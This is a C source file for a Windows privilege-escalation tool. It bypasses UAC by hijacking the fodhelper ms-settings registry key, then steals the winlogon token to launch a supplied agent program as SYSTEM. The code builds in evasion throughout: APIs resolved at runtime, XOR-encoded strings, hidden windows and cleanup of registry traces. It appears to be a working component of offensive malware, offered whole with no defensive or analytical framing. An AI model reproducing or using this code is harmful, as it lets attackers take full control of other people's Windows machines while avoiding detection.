/*
 * lifter.c — minimal UAC bypass + winlogon token steal
 *
 * Two modes selected by first arg:
 *   (none)   MEDIUM IL — writes fodhelper HKCU key, fires bypass
 *   --admin  HIGH IL   — enables privileges, steals winlogon token,
 *                        spawns argv[2] (agent.exe) as SYSTEM
 *
 * Evasion:
 *   • All sensitive APIs resolved at runtime via GetProcAddress
 *   • API/DLL strings XOR-encoded at rest via EVS_D (per-build random key)
 *   • No console window (-mwindows)
 *   • No debug output
 */

#include <windows.h>
#include "peb_walk.h"
#include "evs_strings.h"
#include <tlhelp32.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>

/* ── Dynamic API typedefs ─────────────────────────────────────────────── */

typedef BOOL  (WINAPI *fn_OPT)(HANDLE,DWORD,PHANDLE);
typedef BOOL  (WINAPI *fn_ATP)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
typedef BOOL  (WINAPI *fn_LPV)(LPCSTR,LPCSTR,PLUID);
typedef BOOL  (WINAPI *fn_DTE)(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
typedef BOOL  (WINAPI *fn_CTM)(HANDLE,PSID,PBOOL);
typedef BOOL  (WINAPI *fn_AIS)(PSID_IDENTIFIER_AUTHORITY,BYTE,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,PSID*);
typedef PVOID (WINAPI *fn_FS) (PSID);
typedef BOOL  (WINAPI *fn_CPWT)(HANDLE,DWORD,LPCWSTR,LPWSTR,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef BOOL  (WINAPI *fn_CPAU)(HANDLE,LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef BOOL  (WINAPI *fn_SEE) (SHELLEXECUTEINFOA*);
typedef LONG  (WINAPI *fn_RCK) (HKEY,LPCSTR);
typedef LONG  (WINAPI *fn_RCE) (HKEY,LPCSTR,DWORD,LPCSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG  (WINAPI *fn_RSV) (HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD);
typedef LONG  (WINAPI *fn_RCL) (HKEY);

typedef struct {
    fn_OPT  OpenProcessToken;
    fn_ATP  AdjustTokenPrivileges;
    fn_LPV  LookupPrivilegeValueA;
    fn_DTE  DuplicateTokenEx;
    fn_CTM  CheckTokenMembership;
    fn_AIS  AllocateAndInitializeSid;
    fn_FS   FreeSid;
    fn_CPWT CreateProcessWithTokenW;
    fn_CPAU CreateProcessAsUserW;
    fn_SEE  ShellExecuteExA;
    fn_RCK  RegDeleteKeyA;
    fn_RCE  RegCreateKeyExA;
    fn_RSV  RegSetValueExA;
    fn_RCL  RegCloseKey;
} api_t;

/* ── String builders ──────────────────────────────────────────────────── */

static void _build_reg_path(char *out, size_t sz)
{
    char _ms[12];
    EVS_D(_ms, EVS_str_ms_settings);
    snprintf(out, sz, "Software\\Classes\\%s\\Shell\\Open\\command", _ms);
    SecureZeroMemory(_ms, sizeof(_ms));
}

static void _build_reg_root(char *out, size_t sz)
{
    char _ms[12];
    EVS_D(_ms, EVS_str_ms_settings);
    snprintf(out, sz, "Software\\Classes\\%s", _ms);
    SecureZeroMemory(_ms, sizeof(_ms));
}

static void _build_fod(char *out, size_t sz)
{
    char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, sizeof(sys32));
    char _fn[14];
    EVS_D(_fn, EVS_str_fodhelper_exe);
    snprintf(out, sz, "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));
}

static void _build_delexec(char *out)
{
    EVS_D(out, EVS_str_DelegateExecute);
}

static void _build_winlogon(char *out)
{
    EVS_D(out, EVS_str_winlogon_exe);
}

/* ── API resolution ───────────────────────────────────────────────────── */

static int _resolve(api_t *api)
{
    char _dl[13];
    EVS_D(_dl, EVS_dll_kernel32);
    HMODULE hk32 = _peb_module(_dl);
    SecureZeroMemory(_dl, sizeof(_dl));

    EVS_D(_dl, EVS_dll_advapi32);
    HMODULE had = LoadLibraryA(_dl);
    SecureZeroMemory(_dl, sizeof(_dl));

    char _sh[12];
    EVS_D(_sh, EVS_dll_shell32);
    HMODULE hsh32 = LoadLibraryA(_sh);
    SecureZeroMemory(_sh, sizeof(_sh));

    if (!hk32 || !had || !hsh32) return -1;

    char _fn[25];

#define _R(api_field, cast, mod, evs_arr) do { \
    EVS_D(_fn, evs_arr); \
    (api_field) = (cast)(void*)GetProcAddress((mod), _fn); \
    SecureZeroMemory(_fn, sizeof(_fn)); \
} while(0)

    _R(api->OpenProcessToken,         fn_OPT,  had,   EVS_fn_OpenProcessToken);
    _R(api->AdjustTokenPrivileges,    fn_ATP,  had,   EVS_fn_AdjustTokenPrivileges);
    _R(api->LookupPrivilegeValueA,    fn_LPV,  had,   EVS_fn_LookupPrivilegeValueA);
    _R(api->DuplicateTokenEx,         fn_DTE,  had,   EVS_fn_DuplicateTokenEx);
    _R(api->CheckTokenMembership,     fn_CTM,  had,   EVS_fn_CheckTokenMembership);
    _R(api->AllocateAndInitializeSid, fn_AIS,  had,   EVS_fn_AllocateAndInitializeSid);
    _R(api->FreeSid,                  fn_FS,   had,   EVS_fn_FreeSid);
    _R(api->CreateProcessWithTokenW,  fn_CPWT, had,   EVS_fn_CreateProcessWithTokenW);
    _R(api->CreateProcessAsUserW,     fn_CPAU, had,   EVS_fn_CreateProcessAsUserW);
    _R(api->ShellExecuteExA,          fn_SEE,  hsh32, EVS_fn_ShellExecuteExA);
    _R(api->RegDeleteKeyA,            fn_RCK,  had,   EVS_fn_RegDeleteKeyA);
    _R(api->RegCreateKeyExA,          fn_RCE,  had,   EVS_fn_RegCreateKeyExA);
    _R(api->RegSetValueExA,           fn_RSV,  had,   EVS_fn_RegSetValueExA);
    _R(api->RegCloseKey,              fn_RCL,  had,   EVS_fn_RegCloseKey);

#undef _R

    return (api->OpenProcessToken && api->DuplicateTokenEx &&
            api->ShellExecuteExA  && api->RegCreateKeyExA) ? 0 : -1;
}

/* ── Helper: check if running as admin (full token) ─────────────────── */

static BOOL _is_admin(api_t *api)
{
    BOOL admin = FALSE;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID sid = NULL;
    if (api->AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0,0,0,0,0,0, &sid)) {
        api->CheckTokenMembership(NULL, sid, &admin);
        api->FreeSid(sid);
    }
    return admin;
}

/* ── Enable four key privileges ──────────────────────────────────────── */

static void _enable_privs(api_t *api)
{
    HANDLE htok = NULL;
    if (!api->OpenProcessToken(GetCurrentProcess(),
                               TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &htok))
        return;

    char _priv[30];
    LUID luid = {0};
    TOKEN_PRIVILEGES tp = {0};

#define _ENA(evs_arr) do { \
    EVS_D(_priv, evs_arr); \
    if (api->LookupPrivilegeValueA(NULL, _priv, &luid)) { \
        tp.PrivilegeCount           = 1; \
        tp.Privileges[0].Luid       = luid; \
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; \
        api->AdjustTokenPrivileges(htok, FALSE, &tp, sizeof(tp), NULL, NULL); \
    } \
    SecureZeroMemory(_priv, sizeof(_priv)); \
} while(0)

    _ENA(EVS_str_SeDebugPrivilege);
    _ENA(EVS_str_SeImpersonatePrivilege);
    _ENA(EVS_str_SeAssignPrimaryTokenPrivilege);
    _ENA(EVS_str_SeIncreaseQuotaPrivilege);

#undef _ENA
    CloseHandle(htok);
}

/* ── Find winlogon.exe PID ───────────────────────────────────────────── */

static DWORD _winlogon_pid(void)
{
    char _wl[13];
    _build_winlogon(_wl);

    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, _wl) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return pid;
}

/* ── Elevated path: steal winlogon token → spawn agent as SYSTEM ─────── */

static int _run_admin(api_t *api, const char *agent_path)
{
    _enable_privs(api);

    DWORD pid = _winlogon_pid();
    if (!pid) return -1;

    HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hp) return -1;

    HANDLE htok = NULL;
    if (!api->OpenProcessToken(hp,
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &htok)) {
        CloseHandle(hp);
        return -1;
    }
    CloseHandle(hp);

    HANDLE hdup = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
    if (!api->DuplicateTokenEx(htok, MAXIMUM_ALLOWED, &sa,
                               SecurityImpersonation, TokenPrimary, &hdup)) {
        CloseHandle(htok);
        return -1;
    }
    CloseHandle(htok);

    /* Convert agent path to wide */
    int wlen = MultiByteToWideChar(CP_ACP, 0, agent_path, -1, NULL, 0);
    WCHAR *wpath = (WCHAR*)LocalAlloc(LMEM_ZEROINIT, (SIZE_T)wlen * sizeof(WCHAR));
    if (!wpath) { CloseHandle(hdup); return -1; }
    MultiByteToWideChar(CP_ACP, 0, agent_path, -1, wpath, wlen);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;
    BOOL ok = FALSE;

    if (api->CreateProcessWithTokenW)
        ok = api->CreateProcessWithTokenW(
                hdup, LOGON_WITH_PROFILE, wpath, NULL, flags,
                NULL, NULL, &si, &pi);

    if (!ok && api->CreateProcessAsUserW)
        ok = api->CreateProcessAsUserW(
                hdup, wpath, NULL, NULL, NULL, FALSE, flags,
                NULL, NULL, &si, &pi);

    LocalFree(wpath);
    CloseHandle(hdup);

    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok ? 0 : -1;
}

/* ── Normal path: UAC bypass via fodhelper ms-settings hijack ────────── */

static int _run_bypass(api_t *api, const char *self_path, const char *agent_path)
{
    char reg_key[128], reg_root[64];
    _build_reg_path(reg_key,  sizeof(reg_key));
    _build_reg_root(reg_root, sizeof(reg_root));

    /* cmd /c start "" "self_path" --admin "agent_path" */
    char cmd_val[MAX_PATH * 2 + 64];
    snprintf(cmd_val, sizeof(cmd_val),
             "cmd /c start \"\" \"%s\" --admin \"%s\"", self_path, agent_path);

    HKEY hk = NULL;
    if (api->RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL, 0,
                              KEY_WRITE, NULL, &hk, NULL) != ERROR_SUCCESS)
        return -1;

    api->RegSetValueExA(hk, NULL, 0, REG_SZ,
                        (const BYTE*)cmd_val, (DWORD)(strlen(cmd_val) + 1));

    char de[16];
    _build_delexec(de);
    api->RegSetValueExA(hk, de, 0, REG_SZ, (const BYTE*)"", 1);
    api->RegCloseKey(hk);

    char fod[MAX_PATH + 16];
    _build_fod(fod, sizeof(fod));

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    /* fMask = 0: no flags, matches PrivEsc01.c — NOCLOSEPROCESS breaks auto-elevate */
    sei.lpFile = fod;
    sei.nShow  = SW_HIDE;

    BOOL ok = api->ShellExecuteExA(&sei);
    Sleep(3000);

    /* Cleanup: delete created keys bottom-up */
    api->RegDeleteKeyA(HKEY_CURRENT_USER, reg_key);
    {
        char _da[13], _fn[15];
        EVS_D(_da, EVS_dll_advapi32);
        HMODULE had2 = _peb_module(_da);
        SecureZeroMemory(_da, sizeof(_da));
        typedef LONG (WINAPI *fn_RDT)(HKEY,LPCSTR);
        fn_RDT pRDT = NULL;
        if (had2) {
            EVS_D(_fn, EVS_fn_RegDeleteTreeA);
            pRDT = (fn_RDT)(void*)GetProcAddress(had2, _fn);
            SecureZeroMemory(_fn, sizeof(_fn));
        }
        if (pRDT) pRDT(HKEY_CURRENT_USER, reg_root);
    }

    return ok ? 0 : -1;
}

/* ── Entry point ─────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpCmd, int nC)
{
    (void)hI; (void)hP; (void)lpCmd; (void)nC;

    api_t api;
    if (_resolve(&api) != 0)
        return 1;

    /* Parse args from command line */
    int   argc = 0;
    LPWSTR *argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv_w) return 1;

    /* Convert argv[1] and argv[2] to narrow */
    char arg1[MAX_PATH] = {0}, arg2[MAX_PATH] = {0};
    if (argc >= 2)
        WideCharToMultiByte(CP_ACP, 0, argv_w[1], -1, arg1, sizeof(arg1), NULL, NULL);
    if (argc >= 3)
        WideCharToMultiByte(CP_ACP, 0, argv_w[2], -1, arg2, sizeof(arg2), NULL, NULL);
    LocalFree(argv_w);

    /* --admin "agent_path": elevated — steal winlogon token, spawn agent */
    if (strcmp(arg1, "--admin") == 0) {
        if (!arg2[0]) return 1; /* agent path required */
        return _run_admin(&api, arg2) == 0 ? 0 : 1;
    }

    /* "agent_path": normal — UAC bypass via fodhelper */
    if (!arg1[0]) return 1; /* agent path required */
    const char *agent_path = arg1;

    if (_is_admin(&api)) {
        /* Already elevated — go straight to token steal */
        return _run_admin(&api, agent_path) == 0 ? 0 : 1;
    }

    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, sizeof(self) - 1);
    return _run_bypass(&api, self, agent_path) == 0 ? 0 : 1;
}
